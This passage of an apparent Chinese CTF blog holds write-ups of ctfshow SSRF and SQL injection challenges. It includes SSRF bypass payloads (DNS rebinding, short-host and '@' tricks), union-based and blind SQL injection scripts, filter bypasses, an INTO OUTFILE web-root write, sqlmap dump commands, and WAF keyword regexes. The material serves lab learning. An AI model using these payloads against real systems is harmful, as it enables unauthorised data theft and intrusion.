<p>解法一和二都是 <strong>DNS Rebinding DNS重绑定</strong>但我不太懂</p>
<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
<ul>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
</ul>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">(9条消息) ctfshow ssrf_InvMacKing的博客-CSDN博客</a></p>
<p><strong>dns解析后都是127.0.0.1</strong>  </p>
<p><a href="http://www.ip33.com/dns.html">dns解析网站</a></p>
<p>ctfshow{36fde1d8-aa94-4340-8dd5-297d32bb75c8}</p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=5))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<p>host长度小于五</p>
<p>payload:<code>url=http://127.1/flag.php</code></p>
<p><code>url=http://0/flag.php</code></p>
<p><code> </code>ctfshow{cccbab1c-c78b-486c-b4da-da079ec826ad}</p>
<h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=3))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>url=http://0/flag.php</code></p>
<p>SSRF常见的绕过方式</p>
<p>（一）更改ip地址写法绕过</p>
<p>一些开发者会通过对传递的URL参数进行正则表达式过滤，代码如下</p>
<pre><code>10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
</code></pre>
<p>这时候，我们可以通过修改进制的方式绕过，如192.168.0.1这个ip地址，就可以改写成</p>
<p>八进制：0300.0250.0.1</p>
<p>十进制整数：3232235521</p>
<p>十六进制&#x2F;整数：0xC0.0xA8.0.1&#x2F;0xC0A80001</p>
<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]); <span class="comment">//返回 IPv4 地址数组，如果无法解析，则返回 false。hostname</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://r.u77wzd.ceye.io/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{d169ee0a-273f-45a7-b225-89cd7b9b0639}</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>variable</td>
<td>必需。规定要过滤的变量。</td>
</tr>
<tr>
<td>filter</td>
<td>可选。规定要使用的过滤器的 ID。</td>
</tr>
<tr>
<td>options</td>
<td>规定包含标志&#x2F;选项的数组。检查每个过滤器可能的标志和选项。</td>
</tr>
</tbody></table>
<ul>
<li>gethostbyname — 返回主机名对应的 IPv4地址。 </li>
<li>filter_var — 使用特定的过滤器过滤一个变量</li>
<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</li>
<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</li>
<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li>
<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
</ul>
<p><a href="https://blog.csdn.net/ing_end/article/details/124369282">https://blog.csdn.net/ing_end/article/details/124369282</a></p>
<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
<p>正则表达式的意思是以<a href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>

<p>如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，</p>
<p>ctfshow{4f304e6c-bcfb-4164-bd32-26590444c2b6}</p>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">https://blog.csdn.net/weixin_52240463/article/details/122659261</a></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-sql注入</title>
    <url>/2023/01/17/ctfshow-web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sql注入</p>
<span id="more"></span>

<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+    #万能密码</span><br></pre></td></tr></table></figure>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>字段数，可以使用，1’ order by 2 –+查询</p>
<p>过滤了回显，所以用一下 to_base64()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select to_base64(username),to_base64(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>变成3个字段，再加一个字段即可，表也改变了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,to_base64(username),to_base64(password) from ctfshow_user3 --+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>Y4tacker师傅写的，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">  可能产生异常的代码块</span><br><span class="line">except [ (Error1, Error2, ... ) [as e] ]:</span><br><span class="line">  处理异常的代码块1</span><br><span class="line">except [ (Error3, Error4, ... ) [as e] ]:</span><br><span class="line">  处理异常的代码块2</span><br><span class="line">except [Exception]:</span><br><span class="line">  处理其它异常</span><br></pre></td></tr></table></figure>

<p>为防止服务器不能及时响应，大部分发至外部服务器的请求都应该带着 timeout 参数。在默认情况下，除非显式指定了 timeout 值，requests 是不会自动进行超时处理的。如果没有 timeout，你的代码可能会挂起若干分钟甚至更长时间。在爬虫代理这一块我们经常会遇到请求超时的问题，<strong>代码就卡在哪里，不报错也没有requests请求的响应。</strong></p>
<p>通常的处理是在requests.get()语句中加入timeout限制请求时间</p>
<p>解法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>访问1.txt即可</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>空格绕过</p>
<p>%0a %0b %0c %0d %09 注释&#x2F;**&#x2F; 括号等一些符号隔开</p>
<h2 id="web183-正则匹配"><a href="#web183-正则匹配" class="headerlink" title="web183-正则匹配"></a>web183-正则匹配</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>查询结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的题目，就睡一段</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.<a href="https://so.csdn.net/so/search?q=format%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">format函数</a>的语法及用法</p>
<p>（1）语法：’{}’.format()</p>
<p>（2）用法：用于格式化字符串。可以接受无限个参数，可以指定顺序。返回结果为字符串。</p>
<p>#默认顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;学习&#123;&#125;中的&#123;&#125;函数&#x27;.format(&#x27;python&#x27;,&#x27;format&#x27;)</span><br><span class="line">-&gt;&#x27;学习python中的format函数&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_50853979/article/details/125128977">https://blog.csdn.net/weixin_50853979/article/details/125128977</a></p>
<p><strong>正则表达式用来匹配文本的特殊的串（字符集合）（匹配文本，将一个模式（正则表达式）与一个文本串进行比较）</strong></p>
<p>LIKE 和 REGEXP之间的重要差别</p>
<p>LIKE 匹配整个列，如果被匹配的文本在列值中出现，LIKE 将不会找到它，相应的行也不会被返回（除非使用通配符）。而 REGEXP 在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP 将会找到它，相应的行将被返回，并且 REGEXP 能匹配整个列值（与 LIKE 相同的作用）</p>
<p>   反引号，一般在ESC键的下方。<strong>它是为了<strong><strong>区分</strong></strong>MYSQL的<strong><strong>保留字</strong></strong>与<strong><strong>普通字符</strong></strong>而引入的符号。</strong></p>
<p>MySQL里使用一对反勾号“ &#96; ”将识别符括起来，一般情况下可以不用，<strong>单是如果识别符出现关键字冲突或标识符的写法可能产生歧义的情况下就必须使用</strong>。</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">查询结果</span><br><span class="line"></span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>where、单双引号、反引号都被过滤了，但是本题没有过滤空格。<br> where可以用having代替，单双引号可以用 括号+十六进制。</p>
<p>having和where可以替换，但是having语句有使用条件</p>
<p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p>
<p>tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25</p>
<p>ctfshow{}转为16进制</p>
<p>上述脚本修改date即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>[SQL绕过]md5($str,true)类型绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/March97/article/details/81222922">(4条消息) sql注入：md5($password,true)_March97的博客-CSDN博客</a></p>
<p>抓包返回结果即可看到flag</p>
<h2 id="web188–MYSQL的弱比较"><a href="#web188–MYSQL的弱比较" class="headerlink" title="web188–MYSQL的弱比较"></a>web188–MYSQL的弱比较</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line">if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码检测</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码判断</span><br><span class="line">if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>用户登陆</p>
<p>用户名:   </p>
<p>密码:</p>
<p>对于username的绕过，一种是利用mysql里面的弱比较类型，字符串和数字比较时，字符串永远化作0</p>
<p>去比较，有点像php的比较一样，所以，这里可以用0绕过，还有一种就是通过逻辑，在运算的时候对 </p>
<p>|| ，一真则真，就绕过了。接下来就是php里面常见的intval()函数的绕过，password应该是字符开头</p>
<p>的数据，字符串会变0来进行这种弱比较，所以password也为0就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=0 </span><br><span class="line"></span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure>

<p>登录成功后</p>
<p>f12  crtl+r</p>
<p>打开网络api文件即使登陆后的文件</p>
<p>ctfshow{1374102b-8d14-4716-8f93-daba7274e984}</p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>布尔盲注，二分法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # 查数据库</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #查数据库</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # 查字段</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # 查flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;密码错误&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>



<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/api/index.php?id= --referer=&quot;http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/sqlmap.php&quot; --dump</span><br></pre></td></tr></table></figure>

<p>–dump显示所有字段</p>
<p>为啥是api 我也不懂d</p>
<p>注意没有referer否则爆不出来</p>
<p>ctfshow{b651c961-4e84-4d79-a08c-42114b092c45}</p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/api/ --data=&quot;id=1&quot; --referer=&quot;http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/sqlmap&quot; --dump</span><br></pre></td></tr></table></figure>

<p>注意是data别拼错了</p>
<p>ctfshow{165ee80d-8978-4e45-beb4-5e907b5fa988}</p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>–method&#x3D; 修改sqlmap的提交方式，以什么方式提交 </p>
<p>Content-Type：用于定义用户的浏览器或相关设备如何显示将要加载的数据，或者如何处理将要加载的数据</p>
<p>　　MIME：MIME类型就是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
<p>text&#x2F;html的意思是将文件的content-type设置为text&#x2F;html的形式，浏览器在获取到这种文件时会自动调用html的解析器对文件进行相应的处理。</p>
<p>text&#x2F;plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
<p>PUT提交方式要注意，修改headers为Content-Type: text&#x2F;plain，否则默认为表单发送，PUT请求接受不到.</p>
